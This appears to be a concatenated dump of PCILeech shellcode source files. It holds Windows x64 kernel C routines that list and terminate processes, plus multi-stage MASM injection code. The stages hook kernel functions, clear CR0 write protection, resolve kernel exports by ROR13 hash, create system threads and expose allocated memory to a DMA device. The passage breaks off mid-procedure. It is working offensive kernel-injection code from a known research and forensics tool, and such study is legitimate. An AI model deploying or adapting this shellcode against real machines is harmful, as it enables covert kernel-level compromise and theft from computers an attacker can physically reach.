#define H_ZwClose								0x5d044c61
#define H_ZwOpenProcess							0xf0d09d60
#define H_ZwTerminateProcess					0x792cbc53

typedef struct tdKERNEL_FUNCTIONS2 {
	NTSTATUS(*ZwClose)(
		_In_ HANDLE Handle
		);
	NTSTATUS(*ZwOpenProcess)(
		_Out_    PHANDLE            ProcessHandle,
		_In_     ACCESS_MASK        DesiredAccess,
		_In_     POBJECT_ATTRIBUTES ObjectAttributes,
		_In_opt_ PCLIENT_ID         ClientId
		);
	NTSTATUS(*ZwTerminateProcess)(
		_In_opt_ HANDLE   ProcessHandle,
		_In_     NTSTATUS ExitStatus
		);
} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	QWORD FUNC2[][2] = {
		{ &fnk2->ZwClose,							H_ZwClose },
		{ &fnk2->ZwOpenProcess,						H_ZwOpenProcess },
		{ &fnk2->ZwTerminateProcess,				H_ZwTerminateProcess }
	};
	for(QWORD j = 0; j < (sizeof(FUNC2) / sizeof(QWORD[2])); j++) {
		*(PQWORD)FUNC2[j][0] = PEGetProcAddressH(qwNtosBase, (DWORD)FUNC2[j][1]);
	}
}

//----------------------------------------------------------------------------------------------------------

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	NTSTATUS nt;
	OBJECT_ATTRIBUTES ObjectAttributes;
	KERNEL_FUNCTIONS fnk;
	KERNEL_FUNCTIONS2 fnk2;
	HANDLE ZwProcessHandle;
	CLIENT_ID ClientId;
	// validate indata and create function maps
	if(!pk->dataIn[0]) {
		pk->dataOut[0] = STATUS_INVALID_PARAMETER;
		return;
	}
	InitializeKernelFunctions(pk->AddrKernelBase, &fnk);
	InitializeKernelFunctions2(pk->AddrKernelBase, &fnk2);
	// open process handle
	fnk.RtlZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
	fnk.RtlZeroMemory(&ClientId, sizeof(CLIENT_ID));
	ClientId.UniqueThread = 0;
	ClientId.UniqueProcess = (HANDLE)pk->dataIn[0];
	nt = fnk2.ZwOpenProcess(&ZwProcessHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		return;
	}
	// terminate process and exit
	pk->dataOut[0] = fnk2.ZwTerminateProcess(ZwProcessHandle, (NTSTATUS)pk->dataIn[1]);
	fnk2.ZwClose(ZwProcessHandle);
}

```

`pcileech_shellcode/wx64_pslist.c`:

```c
// wx64_pslist.c : kernel code to list running processes (name and PID).
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_pslist.c
// ml64 wx64_common_a.asm /Fewx64_pslist.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pslist.obj wx64_common.obj
// shellcode64.exe -o wx64_pslist.exe "ACTIVE PROCESS LIST                                                        \n===========================================================================\nNTSTATUS: %s0x%08x                                                         \nIN TOTAL %i ENTRIES EXISTS, SEE BELOW FOR MORE INFORMATION                 \n===========================================================================\n"
//
#include "wx64_common.h"

typedef struct tdKERNEL_FUNCTIONS2 {
	LPSTR(*PsGetProcessImageFileName)(
		_In_  PEPROCESS Process
		);
	NTSTATUS(*PsLookupProcessByProcessId)(
		_In_  HANDLE    ProcessId,
		_Out_ PEPROCESS *Process
		);
	size_t(*strnlen)(
		const char *str,
		size_t numberOfElements
		);
} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	QWORD FUNC2[][2] = {
		{ &fnk2->PsGetProcessImageFileName,			H_PsGetProcessImageFileName },
		{ &fnk2->PsLookupProcessByProcessId,		H_PsLookupProcessByProcessId },
		{ &fnk2->strnlen,							H_strnlen }
	};
	for(QWORD j = 0; j < (sizeof(FUNC2) / sizeof(QWORD[2])); j++) {
		*(PQWORD)FUNC2[j][0] = PEGetProcAddressH(qwNtosBase, (DWORD)FUNC2[j][1]);
	}
}

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[68];
	LONG BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

NTSTATUS GetProcessNameFromPid(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE pid, _In_ SIZE_T cb, _Out_ PBYTE pb)
{
	PEPROCESS Process;
	LPSTR sz;
	SIZE_T csz;
	NTSTATUS nt = fnk2->PsLookupProcessByProcessId(pid, &Process);
	if(NT_SUCCESS(nt)) {
		sz = fnk2->PsGetProcessImageFileName(Process);
		csz = fnk2->strnlen(sz, cb);
		fnk->RtlCopyMemory(pb, sz, csz);
	}
	return nt;
}

NTSTATUS ActionDefault(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	CHAR ABET_HEX[] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
	NTSTATUS nt;
	PBYTE pbSPIBuffer;
	ULONG cbSPIBuffer;
	PSYSTEM_PROCESS_INFORMATION pPI;
	QWORD qwAddrOut, qwPID;
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &cbSPIBuffer);
	if(nt != 0xC0000004 || !cbSPIBuffer) {
		return nt;
	}
	pbSPIBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSPIBuffer);
	if(!pbSPIBuffer) { 
		return E_OUTOFMEMORY; 
	}
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, pbSPIBuffer, cbSPIBuffer, &cbSPIBuffer);
	if(NT_SUCCESS(nt)) {
		pPI = (PSYSTEM_PROCESS_INFORMATION)pbSPIBuffer;
		qwAddrOut = pk->DMAAddrVirtual + pk->dataOutExtraOffset + pk->dataOutExtraLength;
		do {
			pk->dataOut[1]++;
			qwAddrOut = pk->DMAAddrVirtual + pk->dataOutExtraOffset + pk->dataOutExtraLength;
			*(PQWORD)(qwAddrOut + 0x00) = 0x2020202020202020;
			*(PQWORD)(qwAddrOut + 0x08) = 0x2020202020202020;
			pk->dataOutExtraLength += 0x20;
			qwPID = pPI->UniqueProcessId;
			GetProcessNameFromPid(fnk, fnk2, (HANDLE)qwPID, 0x10, (PBYTE)qwAddrOut);
			*(PDWORD)(qwAddrOut + 0x10) = 0x3D444950;
			*(PBYTE)(qwAddrOut + 0x1f) = '\n';
			*(PBYTE)(qwAddrOut + 0x1e) = '\r';
			*(PBYTE)(qwAddrOut + 0x1d) = '0' + (qwPID % 10);
			*(PBYTE)(qwAddrOut + 0x1c) = '0' + ((qwPID / 10) % 10);
			*(PBYTE)(qwAddrOut + 0x1b) = '0' + ((qwPID / 100) % 10);
			*(PBYTE)(qwAddrOut + 0x1a) = '0' + ((qwPID / 1000) % 10);
			*(PBYTE)(qwAddrOut + 0x19) = '0' + ((qwPID / 10000) % 10);
			*(PBYTE)(qwAddrOut + 0x18) = '|';
			*(PBYTE)(qwAddrOut + 0x17) = ABET_HEX[qwPID & 0xf];
			*(PBYTE)(qwAddrOut + 0x16) = ABET_HEX[(qwPID >> 4) & 0xf];
			*(PBYTE)(qwAddrOut + 0x15) = ABET_HEX[(qwPID >> 8) & 0xf];
			*(PBYTE)(qwAddrOut + 0x14) = ABET_HEX[(qwPID >> 12) & 0xf];
			if(!pPI->NextEntryOffset) {
				break;
			}
			pPI = (PSYSTEM_PROCESS_INFORMATION)((QWORD)pPI + pPI->NextEntryOffset);
		} while(((QWORD)pPI >= (QWORD)pbSPIBuffer) && ((QWORD)pPI < (QWORD)pbSPIBuffer + cbSPIBuffer));
	}
	if(pbSPIBuffer) { fnk->ExFreePool(pbSPIBuffer); }
	return nt;
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	KERNEL_FUNCTIONS fnk;
	KERNEL_FUNCTIONS2 fnk2;
	InitializeKernelFunctions(pk->AddrKernelBase, &fnk);
	InitializeKernelFunctions2(pk->AddrKernelBase, &fnk2);
	pk->dataOut[0] = ActionDefault(pk, &fnk, &fnk2);
}
```

`pcileech_shellcode/wx64_stage1.asm`:

```asm
; wx64_stage1.asm : assembly to redirect hook to larger code section.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	label_main_base:
	CALL label_main_base
main ENDP

; -----------------------------------------------------------------------------
; Info
; compiles into  E8FBFFFFFF
; In order to CALL correct stage2 entry point address the value FBFFFFFF
; (FFFFFFFB when loaded as DWORD) has to be incremented with the offset between
; stage1 and stage2. 
; After completing stage2 - JMP back to CALL-stack - 5 (length of shellcode)
; -----------------------------------------------------------------------------

END

```

`pcileech_shellcode/wx64_stage2.asm`:

```asm
; wx64_stage2.asm : assembly to receive execution from stage1 shellcode.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag		db 00h
	data_filler				db 00h
	data_phys_addr_alloc	dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_code			dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_offset_dummy		dd 00000000h						; 16 bytes offset (4 bytes long) - dummy offset for lx64_stage2 compabilty.
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	POP rax
	SUB rax, 5
	PUSH rax
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	; ----------------------------------------------------
	; 2: ENABLE SUPERVISOR WRITE
	; ----------------------------------------------------
	MOV rcx, cr0
	PUSH rcx
	AND ecx, 0fffeffffh
	MOV cr0, rcx
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (8 bytes)
	; ----------------------------------------------------
	MOV rdx, [data_orig_code]
	MOV [rax], rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: SET UP CALL STACK AND PARAMETERS
	;    param0 = address of NTOS code. First entry of
	;    IDT table = division by zero points into NTOSKRNL
	; ----------------------------------------------------
	PUSH r12
	PUSH r13
	SUB rsp, 020h
	SIDT [rsp]
	MOV rcx, [rsp+2]       
	MOV rcx, [rcx+4]                ; param0
	; ----------------------------------------------------
	; 5: CALL MAIN SETUP CODE
	; ----------------------------------------------------
	CALL SetupEntryPoint
	ADD rsp, 020h
	POP r13
	POP r12
	; ----------------------------------------------------
	; 7: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP rax
	MOV cr0, rax
	POP r9
	POP r8
	POP rdx
	POP rcx
	RET
main ENDP

; ----------------------------------------------------
; Perform ROR13 hashing
; rcx -> string ptr
; rax <- result
; ----------------------------------------------------
HashROR13A PROC
	PUSH rsi
	PUSH rdi
	MOV rsi, rcx
	XOR rdi, rdi
	XOR rax, rax
	CLD
	hash_loop:
	LODSB
	TEST al, al
	JZ hash_loop_finish
	ROR edi, 13
	ADD edi, eax
	JMP hash_loop
	hash_loop_finish:
	MOV eax, edi
	POP rdi
	POP rsi
	RET
HashROR13A ENDP

; ----------------------------------------------------
; Search for PE header given an address. May cause page faults.
; rcx -> scan address
; rax <- header address
; ----------------------------------------------------
PEGetModuleFromAddress_ScanBack PROC
	SHR rcx, 12
	SHL rcx, 12
	address_loop:
	MOV eax, 1000h
	SUB rcx, rax
	MOV ax, [rcx]		; dos header magic
	CMP ax, 5a4dh
	JNE address_loop
	MOV eax, [rcx+60]	; nt header address offset
	CMP eax, 1000h
	JNBE address_loop
	ADD rax, rcx		; nt header address
	MOV eax, [rax]
	CMP eax, 00004550h	; nt header magic
	JNE address_loop
	MOV rax, rcx
	RET
PEGetModuleFromAddress_ScanBack ENDP


; rcx -> module base address
; rdx -> hash of exported function
; rax <- address of exported function
PEGetProcAddressH PROC
	; rdi = PIMAGE_EXPORT_DIRECTORY
	; rsi = counter NumberOfNames
	PUSH rdi
	PUSH rsi
	MOV edi, [rcx+60]	; nt header address offset
	MOV edi, [rdi+rcx+136]
	ADD rdi, rcx		; ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule  
	MOV r8d, [rdi+24]	; PIMAGE_EXPORT_DIRECTORY->NumberOfNames
	XOR rsi, rsi
	find_loop:
	MOV eax, [rdi+32]			; PIMAGE_EXPORT_DIRECTORY->AddressOfNames
	ADD rax, rcx				; PIMAGE_EXPORT_DIRECTORY->AddressOfNames + hModule
	MOV eax, [rax+rsi*4]		; AddressOfNames[index]
	ADD rax, rcx
	PUSH rcx
	MOV rcx, rax
	CALL HashROR13A
	POP rcx
	CMP eax, edx
	JE find_loop_found
	INC rsi
	JMP find_loop
	find_loop_found:
	; found!
	MOV edx, [rdi+36]		; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals + hModule
	XOR rax, rax
	MOV ax, [rdx+rsi*2]		; AddressOfNameOrdinals[index]
	MOV edx, [rdi+28]		; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions 
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions + hModule
	MOV eax, [rdx+rax*4]	; AddressOfFunctions[index]
	ADD rax, rcx			; AddressOfFunctions[index] + hModule
	POP rsi
	POP rdi
	RET
PEGetProcAddressH ENDP


; rcx -> qwAddrNtosCode
SetupEntryPoint PROC
	; r12 = ntos base address
	; r13 = memory address of allocated buffer
	; ----------------------------------------------------
	; FETCH NTOS BASE ADDRESS
	; ----------------------------------------------------
	CALL PEGetModuleFromAddress_ScanBack
	MOV r12, rax
	; ----------------------------------------------------
	; ALLOCATE 0x2000 CONTIGUOUS MEMORY BELOW 0x7fffffff
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 9f361ebch		; H_MmAllocateContiguousMemory
	CALL PEGetProcAddressH
	MOV rcx, 2000h
	MOV rdx, 7fffffffh	
	CALL rax
	MOV r13, rax
	; ----------------------------------------------------
	; ZERO ALLOCATED MEMORY
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 400h
	clear_loop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ clear_loop
	; ----------------------------------------------------
	; SET UP INITIAL STAGE3 SHELLCODE AND DATA
	; ----------------------------------------------------
	MOV [r13+8], r12
	MOV rax, 048FFFFFFF1058D48h
	MOV [r13+1000h], rax
	MOV rax, 0F07400F88348008Bh
	MOV [r13+1008h], rax
	; ----------------------------------------------------
	; CREATE THREAD
	; ----------------------------------------------------
	PUSH r13
	MOV eax, 1000h
	ADD rax, r13
	PUSH rax
	PUSH 0
	SUB rsp, 020h
	MOV rcx, r12
	MOV edx, 94a06b02h		; H_PsCreateSystemThread
	CALL PEGetProcAddressH
	MOV rcx, r13
	MOV rdx, 1fffffh
	XOR r8, r8
	XOR r9, r9
	CALL rax
	ADD rsp, 038h
	; ----------------------------------------------------
	; RETRIEVE AND SET PHYSICAL ADDRESS
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 5a326357h		; H_MmGetPhysicalAddress
	CALL PEGetProcAddressH	
	;ENTER 20h, 0			; only required to avoid bluescreen in Vista
	MOV rcx, r13
	CALL rax
	;LEAVE					; only required to avoid bluescreen in Vista
	MOV [data_phys_addr_alloc], eax
	RET
SetupEntryPoint ENDP



END

```

`pcileech_shellcode/wx64_stage23_vmm.asm`:

```asm
; wx64_stage23_vmm.asm : assembly to receive execution from initial hook
; based on the memory process file system assisted injection technique.
;
; (c) Ulf Frisk, 2019
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	;    - 1st JMP to main_start is the landing location for the 1st hook
	;    (hook of the function pointer) to gain initial execution.
	;    - 2nd JMP to stage3_c_EntryPoint is the landing for the 2nd hook
	;    (currently placed in hal.dll!HalBugCheckSystem) which receives
	;    execution flow in a safe non-BSOD way after PsCreateSystemThread
	;    - Other values below are filled in at runtime after analyzing and
	;    observing the target system with the memory process file system.
	; ----------------------------------------------------
	JMP main_start
	JMP stage3_c_EntryPoint											; offset 0x02
	data_filler							db 0
	addr_cmpxchg_flag					dq 1111111111111111h		; offset 0x08
	addr_orig_code						dq 2222222222222222h		; offset 0x10
	addr_dbg							dq 3333333333333333h		; offset 0x18
	addr_kmddata						dq 4444444444444444h		; offset 0x20
	addr_NTOSKRNL						dq 5555555555555555h		; offset 0x28
	addr_MmAllocateContiguousMemory		dq 6666666666666666h		; offset 0x30
	addr_PsCreateSystemThread			dq 7777777777777777h		; offset 0x38
	addr_MmGetPhysicalAddress			dq 8888888888888888h		; offset 0x40
	addr_KeGetCurrentIrql				dq 9999999999999999h		; offset 0x48
	addr_JMP_DST						dq 1111111111111111h		; offset 0x50
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	PUSH rax
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH r12
	PUSH r13
	; ----------------------------------------------------
	; 2: ENSURE IRQL PASSIVE
	; ----------------------------------------------------
	CALL [addr_KeGetCurrentIrql]
	TEST rax, rax
	JNZ skipcall
	; ----------------------------------------------------
	; 3: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	MOV rcx, [addr_cmpxchg_flag]
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 4: CALL MAIN SETUP CODE
	; ----------------------------------------------------
	CALL SetupEntryPoint
	; ----------------------------------------------------
	; 5: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP r13
	POP r12
	POP r9
	POP r8
	POP rdx
	POP rcx
	POP rax
	JMP [addr_orig_code]
main ENDP

SetupEntryPoint PROC
	PUSH rax					; STACK ALIGN
	; r12 = address of debug memory location
	; r13 = memory address of KMDDATA
	MOV r12, [addr_dbg]
	; ----------------------------------------------------
	; ALLOCATE 0x1000 CONTIGUOUS MEMORY BELOW 0x7fffffff FOR KMDDATA
	; ----------------------------------------------------
	SUB rsp, 20h
	MOV rcx, 1000h
	MOV rdx, 7fffffffh	
	CALL [addr_MmAllocateContiguousMemory]
	ADD rsp, 20h
	MOV r13, rax
	MOV byte ptr [r12], 2		; DEBUG
	MOV [r12+16], rax			; DEBUG
	; ----------------------------------------------------
	; GET PHYSICAL ADDRESS OF KMDDATA AND SET IT EXTERNALLY
	; ----------------------------------------------------
	SUB rsp, 20h
	MOV rcx, r13
	CALL [addr_MmGetPhysicalAddress]
	ADD rsp, 20h
	MOV rcx, [addr_kmddata]
	MOV [rcx], rax
	MOV byte ptr [r12], 3		; DEBUG
	; ----------------------------------------------------
	; ZERO ALLOCATED MEMORY
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 200h
	clear_loop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ clear_loop
	MOV byte ptr [r12], 4		; DEBUG
	; ----------------------------------------------------
	; SET NTOSBASE IN KMDDATA
	; ----------------------------------------------------
	MOV rax, [addr_NTOSKRNL]
	MOV [r13+8], rax
	MOV byte ptr [r12], 5		; DEBUG
	; ----------------------------------------------------
	; CREATE THREAD
	; ----------------------------------------------------
	PUSH rax					; STACK ALIGN
	PUSH r13					; StartContext
	MOV rax, [addr_JMP_DST]
	PUSH rax					; StartRoutine
	PUSH 0						; ClientId
	SUB rsp, 020h
	XOR r9, r9					; ProcessHandle
	XOR r8, r8					; ObjectAttributes
	MOV rdx, 1fffffh			; DesiredAccess
	MOV rcx, r13				; ThreadHandle
	CALL [addr_PsCreateSystemThread]
	ADD rsp, 040h
	MOV byte ptr [r12], 6		; DEBUG
	; ----------------------------------------------------
	; RETURN
	; ----------------------------------------------------
	POP rax						; STACK ALIGN
	RET
SetupEntryPoint ENDP

END

```

`pcileech_shellcode/wx64_stage23_vmm3.asm`:

```asm
; wx64_stage23_vmm3.asm : assembly for the WIN10_X64_3 KMD inject.
;
; (c) Ulf Frisk, 2020
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_filler						db 00h, 00h				; +002
	original_code:
	data_original_code				dd 44444444h, 44444444h, 44444444h, 44444444h, 44444444h	; +004
	addr_data						dq 1111111111111111h	; +018
	pfnKeGetCurrentIrql				dq 1111111111111111h	; +020
	pfnPsCreateSystemThread			dq 1111111111111111h	; +028
	pfnZwClose						dq 1111111111111111h	; +030
	pfnMmAllocateContiguousMemory	dq 1111111111111111h	; +038
	pfnMmGetPhysicalAddress			dq 1111111111111111h	; +040
	addr_KernelBase					dq 1111111111111111h	; +048
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
main_start:
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	PUSH rdi
	PUSH rsi
	PUSH rbx
	PUSH rbp
	SUB rsp, 020h
	; ----------------------------------------------------
	; CHECK CURRENT IRQL - ONLY IRQL PASSIVE (0) ALLOWED
	; ----------------------------------------------------
	CALL [pfnKeGetCurrentIrql]
	TEST rax, rax
	JNZ skipcall
	; ----------------------------------------------------
	; ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	MOV rcx, addr_data
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; CREATE THREAD
	; ----------------------------------------------------
	PUSH r12					; StartContext
	LEA rax, setup2
	PUSH rax					; StartRoutine
	PUSH 0						; ClientId
	SUB rsp, 020h				; (stack shadow space)
	XOR r9, r9					; ProcessHandle
	XOR r8, r8					; ObjectAttributes
	MOV rdx, 1fffffh			; DesiredAccess
	MOV rcx, addr_data			; ThreadHandle
	ADD rcx, 8
	CALL [pfnPsCreateSystemThread]
	ADD rsp, 038h
	; ----------------------------------------------------
	; CLOSE THREAD HANDLE
	; ----------------------------------------------------
	SUB rsp, 038h				; (stack shadow space + align)
	MOV rcx, addr_data			; ThreadHandle
	MOV rcx, [rcx+8]
	CALL [pfnZwClose]
	ADD rsp, 038h
	; ----------------------------------------------------
	; EXIT - RESTORE AND JMP BACK
	; ----------------------------------------------------
skipcall:
	ADD rsp, 020h
	POP rbp
	POP rbx
	POP rsi
	POP rdi
	POP r15
	POP r14
	POP r13
	POP r12
	POP r11
	POP r10
	POP r9
	POP r8
	POP rdx
	POP rcx
	JMP original_code
main ENDP

; ----------------------------------------------------
; New Thread entry point. Allocate memory and write back
; the physical address so PCILeech may read it with DMA.
; ----------------------------------------------------
setup2 PROC
	; ----------------------------------------------------
	; SET UP STACK SHADOW SPACE (REQUIRED FOR SOME FUNCTION CALLS)
	; ----------------------------------------------------
	PUSH rbp
	MOV rbp, rsp
	SUB rsp, 020h
	; ----------------------------------------------------
	; ALLOCATE 0x1000 CONTIGUOUS MEMORY BELOW 0x7fffffff
	; ----------------------------------------------------
	MOV rcx, 1000h
	MOV rdx, 7fffffffh
	CALL [pfnMmAllocateContiguousMemory]
	MOV r13, rax
	; ----------------------------------------------------
	; ZERO ALLOCATED MEMORY
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 200h
	clear_loop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ clear_loop
	; ----------------------------------------------------
	; WRITE PHYSICAL MEMORY ADDRESS
	; ----------------------------------------------------
	MOV rcx, r13
	CALL [pfnMmGetPhysicalAddress]
	MOV rcx, addr_data
	MOV [rcx+01ch], eax
	; ----------------------------------------------------
	; SET PKMDDATA->AddrKernelBase
	; ----------------------------------------------------
	MOV rax, addr_KernelBase
	MOV [r13+8], rax
	; ----------------------------------------------------
	; CALL C-ENTRYPOINT
	; ----------------------------------------------------
	MOV rcx, r13
	CALL stage3_c_EntryPoint
	; ----------------------------------------------------
	; RETURN
	; ----------------------------------------------------
	ADD rsp, 028h
	XOR rax, rax
	RET
setup2 ENDP

END

```

`pcileech_shellcode/wx64_stage2_hal.asm`:

```asm
; wx64_stage2.asm : assembly modified for the hal.dll heap injection technique.
;
; (c) Ulf Frisk, 2016, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	; ----------------------------------------------------
	; INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag		db 00h
	data_filler				db 00h
	data_phys_addr_alloc	dd 00000000h						; 04h byte offset (4 bytes long)
	data_orig_fnptr			dq 0000000000000000h				; 08h byte offset (8 bytes long)
	data_orig_fnptraddr		dq 0000000000000000h				; 10h byte offset (8 bytes long)
	data_thread_handle		dq 0000000000000000h				; 18h byte offset (8 bytes long)
	; ----------------------------------------------------
	; SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH rbx
	PUSH rsi
	PUSH rdi
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	SUB rsp, 020h
	; ----------------------------------------------------
	; r12 = ntos base address
	; r13 = PsCreateSystemThread address
	; ----------------------------------------------------
	; SET UP STACK AND PARAMETERS
	; param0 = address of NTOS code. First entry of
	; IDT table = division by zero points into NTOSKRNL
	; ----------------------------------------------------
	SIDT [rsp]
	MOV rcx, [rsp+2]       
	MOV rcx, [rcx+4]                ; param0
	; ----------------------------------------------------
	; FETCH NTOS BASE ADDRESS
	; ----------------------------------------------------
	CALL PEGetModuleFromAddress_ScanBack
	MOV r12, rax
	; ----------------------------------------------------
	; CHECK CURRENT IRQL - ONLY IRQL PASSIVE (0) ALLOWED
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 4d90adceh			; H_KeGetCurrentIrql
	CALL PEGetProcAddressH
	CALL rax
	TEST rax, rax
	JNZ skipcall
	; ----------------------------------------------------
	; ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LOCK CMPXCHG [data_cmpxchg_flag], dl
	JNE skipcall
	; ----------------------------------------------------
	; REMOVE HOOK
	; ----------------------------------------------------
	MOV rax, [data_orig_fnptraddr]
	MOV rcx, [data_orig_fnptr]
	MOV [rax], rcx
	; ----------------------------------------------------
	; CREATE THREAD
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 94a06b02h			; H_PsCreateSystemThread
	CALL PEGetProcAddressH
	MOV r13, rax				; PsCreateSystemThread address
	PUSH 0						; (dummy for stack alignment)
	PUSH r12					; StartContext
	LEA rax, setup2
	PUSH rax					; StartRoutine
	PUSH 0						; ClientId
	SUB rsp, 020h				; (stack shadow space)
	XOR r9, r9					; ProcessHandle
	XOR r8, r8					; ObjectAttributes
	MOV rdx, 1fffffh			; DesiredAccess
	LEA rcx, data_thread_handle	; ThreadHandle
	CALL r13
	ADD rsp, 040h
	; ----------------------------------------------------
	; EXIT - RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	ADD rsp, 020h
	POP r13
	POP r12
	POP r11
	POP r10
	POP rdi
	POP rsi
	POP rbx
	POP r9
	POP r8
	POP rdx
	POP rcx
	MOV rax, [data_orig_fnptr]
	JMP rax
main ENDP

; ----------------------------------------------------
; New Thread entry point. Allocate memory, write pre-stage3 code and write back
; the physical address so PCILeech may read it with DMA.
; rcx -> virtual address base of kernel
; r12 :: virtual address base of kernel
; r13 :: virtual address buffer
; ----------------------------------------------------
setup2 PROC
	; ----------------------------------------------------
	; SET UP STACK SHADOW SPACE (REQUIRED FOR SOME FUNCTION CALLS)
	; ----------------------------------------------------
	PUSH rbp
	MOV rbp, rsp
	SUB rsp, 020h
	; ----------------------------------------------------
	; ALLOCATE 0x2000 CONTIGUOUS MEMORY BELOW 0x7fffffff
	; ----------------------------------------------------
	MOV r12, rcx
	MOV edx, 9f361ebch			; H_MmAllocateContiguousMemory
	CALL PEGetProcAddressH
	MOV rcx, 2000h
	MOV rdx, 7fffffffh
	CALL rax
	MOV r13, rax
	; ----------------------------------------------------
	; ZERO ALLOCATED MEMORY
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 400h
	clear_loop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ clear_loop
	; ----------------------------------------------------
	; SET UP INITIAL STAGE3 SHELLCODE AND DATA
	; ----------------------------------------------------
	MOV rax, r12
